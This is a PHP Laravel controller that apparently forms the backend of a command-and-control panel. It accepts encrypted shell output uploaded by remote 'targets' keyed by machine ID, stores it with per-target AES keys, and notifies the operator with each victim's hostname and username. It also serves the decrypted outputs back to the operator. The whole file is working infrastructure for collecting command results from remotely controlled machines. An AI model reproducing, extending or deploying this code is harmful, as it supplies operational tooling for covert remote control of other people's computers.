<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use App\Models\Notification;
use App\Models\Target;
use App\Models\Shell;
use Illuminate\Http\Request;

class ShellController extends Controller
{
    public function post(Request $request)
    {
        $data = $request->validate([
            'id' => 'required|string',
            'output' => 'required|string',
            'command_id' => 'required|string'
        ]);

        $target = Target::where('machine_id', $data['id'])->first();
        if ($target)
        {
            $data['target_id'] = $data['id'];
            unset($data['id']);
            $data['command_id'] = openssl_decrypt(base64_decode($data['command_id']),
                'AES-256-CBC',
                $target->key,
                OPENSSL_RAW_DATA,
                $target->iv
            );
            $data['output'] = base64_encode(openssl_encrypt(
                        $data['output'],
                        'AES-256-cbc',
                        $target->key,
                        OPENSSL_RAW_DATA,
                        $target->iv
                        ));

            Shell::create($data);

            Notification::create([
                'host' => $target->hostname . '\\' . $target->username,
                'action' => 'New stdout uploaded',
                'read' => false,
                'target_id' => $data['target_id']
            ]);
        }

        return response()->json([]);
    }


   public function getOutputs(Request $request)
   {
        $data = $request->validate([
            'id' => 'required|string'
        ]);

        $target = Target::where('machine_id', $data['id'])->first();
        if (!$target) 
        {
            return response()->json([
                'status' => 'failed',
                'message' => 'failed',
                'data' => null
            ]);
        }

        $limit = $request->get('limit', 5);
        $outputs = Shell::where('target_id', $data['id'])
            ->select('id', 'output', 'created_at')
            ->orderBy('id', 'desc')
            ->paginate($limit);

        $outputs->getCollection()->transform(function ($output) use ($target) {
            $output->output = openssl_decrypt(base64_decode($output->output),
                'AES-256-CBC',
                $target->key,
                OPENSSL_RAW_DATA,
                $target->iv
            );

             return $output;
        });


        return response()->json([
            'status' => 'success',
            'message' => 'success',
            'data' => $outputs
        ]);
   }

   public function getOutput($id, Request $request)
   {
        $data = $request->validate([
            'target_id' => 'required|string'
        ]);

        $target = Target::where('machine_id', $data['target_id'])->first();
        if (!$target)
        {
            return response()->json([
                'status' => 'failed',
                'message' => 'Output not found',
                'data' => null
            ]);
        }

        $output = Shell::where('target_id', $data['target_id'])
            ->where('id', $id)
            ->select('id', 'output', 'created_at')
            ->first();
        if ($output)
        {
            $output->output = openssl_decrypt(base64_decode($output->output),
                'AES-256-CBC',
                $target->key,
                OPENSSL_RAW_DATA,
                $target->iv
            );

            return response()->json([
                'status' => 'success',
                'message' => 'success',
                'data' => $output
            ]);
        }

        return response()->json([
                'status' => 'failed',
                'message' => 'Output not found',
                'data' => null
            ]);

   }
}
